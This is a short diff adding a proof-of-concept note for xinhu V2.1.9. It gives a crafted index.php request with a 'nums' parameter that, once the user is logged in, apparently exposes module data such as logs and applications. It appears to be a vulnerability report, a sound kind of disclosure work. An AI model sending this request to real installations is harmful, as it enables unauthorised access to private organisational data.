@@ -1,0 +1,6 @@
+ xinhu V2.1.9
+After the user logged in, open the following  page
+poc：
+/index.php?a=gettotal&m=index&d=home&atype=&loadci=&optdt=&nums=gong,kqdk,apply,officic,syslog,about&ajaxbool=true
+
+Display the corresponding information
